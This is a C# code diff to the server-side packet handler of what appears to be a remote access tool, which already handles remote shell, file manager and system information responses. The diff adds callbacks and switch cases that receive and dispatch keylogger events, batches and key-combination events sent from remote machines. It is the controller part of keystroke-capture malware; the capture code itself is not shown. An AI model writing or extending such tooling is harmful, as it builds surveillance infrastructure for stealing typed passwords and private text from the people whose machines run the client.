@@ -10,12 +10,18 @@ namespace Server.Networking
         private readonly Action<SystemInfoResponse> _onSystemInfoResponse;
         private readonly Action<RemoteShellResponse> _onRemoteShellResponse;
         private readonly Action<FileManagerResponse> _onFileManagerResponse;
+        private readonly Action<KeyLoggerEvent>? _onKeyLoggerEvent;
+        private readonly Action<KeyLoggerBatch>? _onKeyLoggerBatch;
+        private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;
 
-        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse)
+        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
         {
             _onSystemInfoResponse = onSystemInfoResponse;
             _onRemoteShellResponse = onRemoteShellResponse;
             _onFileManagerResponse = onFileManagerResponse;
+            _onKeyLoggerEvent = onKeyLoggerEvent;
+            _onKeyLoggerBatch = onKeyLoggerBatch;
+            _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
         }
 
         public void HandleLine(string json)
@@ -48,6 +54,21 @@ namespace Server.Networking
                         {
                             _onFileManagerResponse(fileResp);
                         }
+                        break;
+
+                    case PacketType.KeyLoggerEvent:
+                        var klEvt = JsonHelper.Deserialize<KeyLoggerEvent>(json);
+                        if (klEvt != null && _onKeyLoggerEvent != null) _onKeyLoggerEvent(klEvt);
+                        break;
+
+                    case PacketType.KeyLoggerBatch:
+                        var klBatch = JsonHelper.Deserialize<KeyLoggerBatch>(json);
+                        if (klBatch != null && _onKeyLoggerBatch != null) _onKeyLoggerBatch(klBatch);
+                        break;
+
+                    case PacketType.KeyLoggerComboEvent:
+                        var klCombo = JsonHelper.Deserialize<KeyLoggerComboEvent>(json);
+                        if (klCombo != null && _onKeyLoggerComboEvent != null) _onKeyLoggerComboEvent(klCombo);
                         break;
 
                     default:
